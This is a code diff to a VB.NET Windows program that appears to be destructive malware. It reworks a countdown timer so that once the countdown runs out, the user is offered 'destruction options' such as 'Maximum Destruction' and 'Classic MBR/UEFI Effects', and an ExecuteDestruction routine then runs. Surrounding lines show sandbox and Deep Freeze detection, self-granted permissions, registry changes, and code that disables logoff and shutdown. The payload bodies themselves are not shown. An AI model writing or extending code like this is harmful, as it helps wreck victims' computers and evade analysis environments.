@@ -86,9 +86,9 @@ Public Class Form1
         Inherits Form
 
         Private ReadOnly random As New Random()
-        Private ReadOnly timerLabel As New Label()
+        Public ReadOnly timerLabel As New Label()
         Private ReadOnly audioPlayer As New AudioPlayer()
-        Private countdownTime As Integer = 60 ' Countdown timer in seconds
+        Public countdownTime As Integer = 60 ' Countdown timer in seconds
         Private portalEffectPhase As Single = 0.0F ' Phase for wavy distortion
 
         ' Initialize the full-screen overlay form
@@ -193,7 +193,7 @@ Public Class Form1
         End Sub
 
         ' Function to execute different payloads based on user choice
-        Private Sub ExecuteDestruction(choice As String)
+        Public Sub ExecuteDestruction(choice As String)
             ' Create an instance of the ComodoAntivirusDetector class
             Dim detector As New StupidSandboxThingsDetector()
             ' Check if Deep Freeze is detected
@@ -286,44 +286,8 @@ Public Class Form1
             End If
         End Sub
 
-        ' Timer tick function, applies effects and updates countdown timer
-        Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs)
-            Try
-                Dim g As Graphics = CreateGraphics()
-                g.SmoothingMode = SmoothingMode.None
-
-                ' Draw portal effect first
-                ApplyPortalEffect(g)
-
-                ' Update the countdown timer label
-                If countdownTime > 0 Then
-                    countdownTime -= 1
-                    timerLabel.Text = "Remaining Time: " & countdownTime.ToString() & " seconds"
-                Else
-                    ' When countdown finishes, prompt user for destruction option
-                    Dim options As String() = {
-                "Maximum Destruction",
-                "Classic MBR/UEFI Effects",
-                "Surprise Me",
-                "Just Make Unusable My PC Without Destruction"
-            }
-
-                    Dim choice As String = PromptUserForChoice("Select a destruction option:", options)
-
-                    If Not String.IsNullOrEmpty(choice) Then
-                        timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
-                        Thread.Sleep(5000) ' Optional: Adjust as needed
-                        ExecuteDestruction(choice)
-                    End If
-                End If
-
-            Catch ex As Exception
-                MessageBox.Show("An error occurred during animation: " & ex.Message, "Animation Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-            End Try
-        End Sub
-
         ' Function to prompt user for a choice using a MessageBox
-        Private Function PromptUserForChoice(messaage As String, options As String()) As String
+        Public Function PromptUserForChoice(messaage As String, options As String()) As String
             Dim result As DialogResult = MessageBox.Show(messaage, "Choose an Option", MessageBoxButtons.OKCancel, MessageBoxIcon.Question)
 
             If result = DialogResult.OK Then
@@ -1172,8 +1136,7 @@ Public Class Form1
         WriteMessageToNotepad()
         GrantSelfPermissions()
         VisualEffectTimer.Start()
-        overlay = New FullScreenOverlay()
-        overlay.Show()
+        AnimationTimer.Start()
         ' Update registry settings and disable Log off
         UpdateRegistrySettings()
         DisableLogoffSwitchUserAndShutdown()
@@ -1215,4 +1178,40 @@ Public Class Form1
         Invalidate() ' Clear the flash effect
     End Sub
 
+    Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs) Handles AnimationTimer.Tick
+        ' Timer tick function, applies effects and updates countdown timer
+        Try
+            overlay = New FullScreenOverlay()
+            Dim g As Graphics = CreateGraphics()
+            g.SmoothingMode = SmoothingMode.None
+
+            ' Draw portal effect first
+            overlay.ApplyPortalEffect(g)
+
+            ' Update the countdown timer label
+            If overlay.countdownTime > 0 Then
+                overlay.countdownTime -= 1
+                overlay.timerLabel.Text = "Remaining Time: " & overlay.countdownTime.ToString() & " seconds"
+            Else
+                ' When countdown finishes, prompt user for destruction option
+                Dim options As String() = {
+                "Maximum Destruction",
+                "Classic MBR/UEFI Effects",
+                "Surprise Me",
+                "Just Make Unusable My PC Without Destruction"
+            }
+
+                Dim choice As String = overlay.PromptUserForChoice("Select a destruction option:", options)
+
+                If Not String.IsNullOrEmpty(choice) Then
+                    overlay.timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
+                    Thread.Sleep(5000) ' Optional: Adjust as needed
+                    overlay.ExecuteDestruction(choice)
+                End If
+            End If
+
+        Catch ex As Exception
+            MessageBox.Show("An error occurred during animation: " & ex.Message, "Animation Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        End Try
+    End Sub
 End Class
